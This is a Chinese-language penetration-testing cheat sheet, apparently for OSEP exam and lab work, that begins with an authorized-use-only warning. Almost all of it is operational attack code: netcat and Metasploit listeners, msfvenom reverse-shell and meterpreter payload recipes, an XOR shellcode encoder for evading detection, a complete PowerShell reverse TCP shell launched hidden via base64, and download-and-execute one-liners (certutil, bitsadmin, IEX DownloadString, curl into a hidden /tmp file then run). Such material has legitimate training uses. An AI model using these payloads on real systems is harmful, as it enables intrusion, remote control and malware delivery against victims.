# 载荷与监听速查

::: warning 仅供学习 / 授权实验
以下命令和源码用于 **OSEP 官方实验与考试环境、自建隔离 lab、已获书面授权的测试**。  
生成物只放在你自己的攻击机上，不要提交编译好的 `.exe` / `.dll` / webshell 文件到 GitHub。  
对未授权系统使用这些技术是违法的。
:::

占位符：`LHOST` `LPORT` `TARGET`。x86 / x64 **不要混用**。

## 监听

```bash
# 通用 TCP
rlwrap -cAr nc -lvnp LPORT | tee ~/lab/logs/shell-LPORT.log

# Metasploit HTTPS（配合 meterpreter）
sudo msfconsole -q -x "use multi/handler; \
  set payload windows/x64/meterpreter/reverse_https; \
  set LHOST LHOST; set LPORT LPORT; set EXITFUNC thread; exploit"

# 带证书
sudo msfconsole -q -x "use multi/handler; \
  set payload windows/x64/meterpreter/reverse_https; \
  set HandlerSSLCert ~/lab/tools/cert.pem; \
  set LHOST LHOST; set LPORT 443; exploit"
```

## msfvenom 矩阵

```bash
# ---- Windows x64 ----
msfvenom -p windows/x64/shell_reverse_tcp LHOST=LHOST LPORT=LPORT EXITFUNC=thread -f exe -o ~/lab/payloads/win/x64/rev.exe
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=LHOST LPORT=LPORT EXITFUNC=thread -f exe -o ~/lab/payloads/win/x64/met.exe
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=LHOST LPORT=LPORT EXITFUNC=thread -f dll -o ~/lab/payloads/win/x64/rev.dll
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=LHOST LPORT=LPORT EXITFUNC=thread -f csharp
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=LHOST LPORT=LPORT EXITFUNC=thread -f vbapplication
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=LHOST LPORT=LPORT EXITFUNC=thread -f raw -o ~/lab/payloads/win/x64/sc.bin
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=LHOST LPORT=LPORT EXITFUNC=thread -f aspx -o ~/lab/payloads/web/rev.aspx
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=LHOST LPORT=LPORT EXITFUNC=thread --encrypt xor --encrypt-key a -f csharp

# ---- Windows x86（32 位 Office / SysWOW64 宿主）----
msfvenom -p windows/shell_reverse_tcp LHOST=LHOST LPORT=LPORT EXITFUNC=thread -f exe -o ~/lab/payloads/win/x86/rev.exe
msfvenom -p windows/meterpreter/reverse_https LHOST=LHOST LPORT=LPORT EXITFUNC=thread -f vbapplication

# ---- Linux ----
msfvenom -p linux/x64/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f elf -o ~/lab/payloads/linux/rev.elf
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=LHOST LPORT=LPORT EXITFUNC=thread -f elf

# ---- PowerShell / 文本 ----
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=LHOST LPORT=LPORT EXITFUNC=thread -f psh -o ~/lab/payloads/win/x64/rev.ps1
msfvenom -p python/meterpreter/reverse_https LHOST=LHOST LPORT=LPORT -f raw
```

XOR 编码 raw shellcode（粘进 C / VBA 数组）：

```python
# xor_encode.py  — 学习用：把 sc.bin 编成 C 数组
import sys
key = 0x2A
data = open(sys.argv[1], "rb").read()
enc = bytes(b ^ key for b in data)
print("unsigned char sc[] = {" + ", ".join(f"0x{b:02x}" for b in enc) + "};")
print(f"/* key = 0x{key:02x}  len = {len(enc)} */")
```

```bash
python3 xor_encode.py ~/lab/payloads/win/x64/sc.bin
```

## PowerShell 反向 TCP（stageless，实验室常用）

自己替换 `LHOST`/`LPORT`。考试环境老方法比花哨 C2 稳。

```powershell
$c = New-Object System.Net.Sockets.TCPClient('LHOST', LPORT)
$s = $c.GetStream()
[byte[]]$b = 0..65535|%{0}
while(($i = $s.Read($b, 0, $b.Length)) -ne 0){
  $d = (New-Object Text.ASCIIEncoding).GetString($b,0,$i)
  $o = (iex $d 2>&1 | Out-String)
  $o2 = $o + 'PS ' + (pwd).Path + '> '
  $sb = ([text.encoding]::ASCII).GetBytes($o2)
  $s.Write($sb,0,$sb.Length)
}
$c.Close()
```

UTF-16LE Base64（给 `powershell -enc`）：

```bash
cat rev.ps1 | iconv -t UTF-16LE | base64 -w 0
# 目标：
powershell -nop -w hidden -enc <BASE64>
```

## 下载执行（Windows）

每次只换一个。投递日志必须有 GET。

```text
curl -s -o C:\Windows\Temp\p.exe http://LHOST/p.exe
certutil -urlcache -split -f http://LHOST/p.exe C:\Windows\Temp\p.exe
bitsadmin /transfer j /download /priority normal http://LHOST/p.exe C:\Windows\Temp\p.exe
powershell -nop -c "IEX (New-Object Net.WebClient).DownloadString('http://LHOST/rev.ps1')"
powershell -nop -c "(New-Object Net.WebClient).DownloadFile('http://LHOST/p.exe','C:\Windows\Temp\p.exe')"
powershell -nop -c "iwr http://LHOST/p.exe -o C:\Windows\Temp\p.exe"
```

命令长度受限时：

```text
curl -so a http://LHOST/a&a
certutil -urlcache -f http://LHOST/a a
powershell -c "iwr http://LHOST/a -o a"
```

下载后校验：

```cmd
certutil -hashfile C:\Windows\Temp\p.exe MD5
```

## Linux 下载

```bash
curl -s http://LHOST/rev.elf -o /tmp/.r && chmod +x /tmp/.r && /tmp/.r
wget -q http://LHOST/rev.elf -O /tmp/.r && chmod +x /tmp/.r
python3 -c "import urllib.request;urllib.request.urlretrieve('http://LHOST/rev.elf','/tmp/.r')"
bash -c 'cat < /dev/tcp/LHOST/LPORT > /tmp/.r'   # 攻击机: nc -lvnp LPORT < rev.elf
```

## 投递服务

```bash
cd ~/lab/payloads && python3 -m http.server 80 2>&1 | tee ~/lab/logs/http-80.log
impacket-smbserver share ~/lab/payloads -smb2support
```
